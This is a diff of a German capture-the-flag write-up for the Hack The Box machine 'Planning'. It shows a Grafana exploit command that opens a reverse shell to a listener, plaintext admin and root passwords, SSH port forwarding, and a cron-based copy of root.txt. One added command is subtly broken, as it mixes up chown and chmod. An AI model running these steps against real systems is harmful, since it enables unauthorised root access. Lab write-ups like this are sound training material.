@@ -78,33 +78,22 @@ nc -lvnp <dein_port>
 ```bash
 sudo python3 poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip <deine_ip> --reverse-port <dein_port>
 ```
-
-**Hinweis:** Auf macOS ist `sudo` erforderlich, um den Exploit erfolgreich auszuführen.
-
 ---
 
 ## 5. 🐚 Root-Zugriff erlangen
 
-**Erwartete Ausgabe nach erfolgreichem Exploit:**
 ```bash
-Connection from 10.10.11.68:33462
-sh: 0: can't access tty; job control turned off
-# id
-uid=0(root) gid=0(root) groups=0(root)
+netstat -tulpn
 ```
 
-**Beispielhafte Umgebung:**
 ```bash
-# env
-GF_PATHS_HOME=/usr/share/grafana
-GF_PATHS_LOGS=/var/log/grafana
-GF_PATHS_PROVISIONING=...
+port 8000 # reroute mit ssh -L 8000:127.0.0.1:8000 enzo@planning.htb 
 ```
 
+Es gibt eine weitere Login-Seite. Login mit root:P4ssw0rdS0pRi0T3c. Es können weitere Cronjobs angelegt werden.
+
+```bash
+cp /root/root.txt /tmp/root.txt && chown 777 enzo:enzo /tmp/root.txt
+```
 ---
 
-## 📝 Zusammenfassung
-
-- **Werkzeuge verwendet:** Nmap, Dirsearch, FFUF, Python-Exploit
-- **Ziel:** Kompromittierung der HTB-Maschine „Planning“ über eine bekannte Grafana-Schwachstelle
-- **Ergebnis:** Erfolgreicher Root-Zugriff auf das Zielsystem
